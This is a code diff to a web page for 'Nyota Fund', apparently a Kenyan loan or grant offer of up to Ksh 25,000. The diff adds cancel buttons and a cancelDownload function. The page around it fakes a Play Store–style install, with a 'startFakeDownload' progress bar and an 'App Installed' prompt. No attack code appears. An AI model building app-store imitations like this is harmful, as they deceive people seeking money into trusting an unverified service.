@@ -108,13 +108,18 @@
 
 <!-- NATIVE INSTALL SUCCESS PROMPT (Bottom Sheet) -->
 <div id="native-install-prompt" class="hide fixed inset-0 z-[10005] bg-slate-900/60 backdrop-blur-sm flex items-end justify-center">
-    <div class="bottom-sheet bg-white w-full max-w-lg rounded-t-3xl p-6 shadow-2xl text-center pb-10">
+    <div class="bottom-sheet bg-white w-full max-w-lg rounded-t-3xl p-6 shadow-2xl text-center pb-10 relative">
+        <button onclick="cancelInstall()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 p-2">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+        </button>
+
         <div class="w-16 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
         <img src="icon-512.png" class="w-20 h-20 rounded-2xl mx-auto mb-4 shadow-md border border-gray-100" alt="Nyota Fund">
         <h2 class="text-2xl font-extrabold text-slate-900 mb-2">App Installed</h2>
         <p class="text-sm text-slate-500 mb-8 px-4">Nyota Fund is ready. You can now open the app directly from your home screen for the best experience.</p>
-        <!-- REMOVED CONTINUE IN BROWSER BUTTON -->
-        <button onclick="closeNativePrompt()" class="native-btn text-lg w-full">Got it</button>
+        
+        <button onclick="closeNativePrompt()" class="native-btn text-lg w-full mb-3">Got it</button>
+        <button onclick="cancelInstall()" class="text-sm font-semibold text-slate-500 w-full mt-2 hover:text-slate-700">Cancel</button>
     </div>
 </div>
 
@@ -173,7 +178,8 @@
             <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
         <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
-            <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
+            <!-- CANCEL BUTTON NOW RESETS THE DOWNLOAD -->
+            <button onclick="cancelDownload()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200">Cancel</button>
             <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
         </div>
 
@@ -249,7 +255,7 @@
         <div class="app-bar">
             <div class="w-full">
                 <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
-                <p class="text-xs text-slate-500 mt-0.5">Your maximum grant is <strong class="font-extrabold text-brandGreen text-sm">Ksh 25,000</strong></p>
+                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <strong class="font-extrabold text-brandGreen text-sm">Ksh 25,000</strong></p>
 
                 <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
                     <div class="bg-emerald-100 p-2 rounded-full flex-shrink-0">
@@ -509,6 +515,12 @@ function closeNativePrompt() {
     showScreen('screen-homescreen');
 }
 
+function cancelInstall() {
+    document.getElementById('native-install-prompt').classList.add('hide');
+    // Reset the download UI
+    showInstallState();
+}
+
 function forceOpenWeb() {
     document.getElementById('native-install-prompt').classList.add('hide');
     playStoreGate.classList.add('hide');
@@ -531,6 +543,11 @@ function startFakeDownload() {
         const progress = Math.min((elapsed / duration) * 100, 100);
         updateProgressUI(progress);
     }, 50);
+}
+
+function cancelDownload() {
+    clearInterval(fakeInterval); // STOP THE DOWNLOAD
+    showInstallState(); // RESET TO INSTALL BUTTON
 }
 
 function updateProgressUI(progress) {
